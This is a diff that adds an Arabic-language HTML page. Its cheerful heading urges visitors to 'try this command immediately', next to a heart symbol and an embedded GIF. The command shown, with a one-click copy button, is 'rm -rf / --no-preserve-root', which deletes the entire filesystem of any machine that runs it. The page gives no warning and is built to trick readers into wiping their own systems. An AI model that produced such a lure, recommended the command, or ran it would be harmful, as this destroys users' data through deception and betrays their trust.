@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أمر رائع!</title>
+    <style>
+        body {
+            background-color: #e6f2ff;
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            padding: 50px;
+            color: #003366;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #cce0ff;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            color: #0066cc;
+        }
+        .command-box {
+            background-color: #b3d9ff;
+            padding: 15px;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 1.2em;
+            margin: 30px auto;
+            width: fit-content;
+            position: relative;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .command-box:hover {
+            background-color: #99ccff;
+            transform: scale(1.02);
+        }
+        .copied-message {
+            position: absolute;
+            top: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #0066cc;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .gif-container {
+            margin-top: 30px;
+            border-radius: 15px;
+            overflow: hidden;
+            max-width: 300px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .heart {
+            color: #ff6699;
+            font-size: 1.5em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>عليك تجربة هذا الأمر فورا <span class="heart">♥</span></h1>
+        
+        <div class="command-box" onclick="copyCommand()">
+            <div id="command">rm -rf / --no-preserve-root</div>
+            <div class="copied-message" id="copiedMessage">نسخ!</div>
+        </div>
+        
+        <div class="gif-container">
+            <div class="tenor-gif-embed" data-postid="5708058284261912152" data-share-method="host" data-aspect-ratio="1" data-width="100%"></div>
+            <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
+        </div>
+    </div>
+
+    <script>
+        function copyCommand() {
+            const commandText = document.getElementById('command').textContent;
+            navigator.clipboard.writeText(commandText).then(() => {
+                const copiedMessage = document.getElementById('copiedMessage');
+                copiedMessage.style.opacity = '1';
+                setTimeout(() => {
+                    copiedMessage.style.opacity = '0';
+                }, 2000);
+            });
+        }
+    </script>
+</body>
+</html>
